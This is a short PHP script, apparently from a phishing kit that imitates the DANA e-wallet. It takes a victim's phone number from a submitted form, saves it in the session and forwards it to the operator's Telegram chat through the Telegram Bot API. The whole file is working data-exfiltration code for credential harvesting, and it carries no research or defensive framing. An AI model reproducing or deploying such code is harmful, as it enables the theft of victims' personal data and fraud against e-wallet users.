<?php
include "../../telegram.php";
session_start();
$nohp = $_POST['nohp'];
$nohp = str_replace("-", "", $nohp);
$nohp = "<code>".$nohp."</code>";
$_SESSION['nohp'] = $nohp;
$message = "
( DANA | NoHP | ".$nohp." )

- No HP : ".$nohp."
 ";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=HTML&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
?>
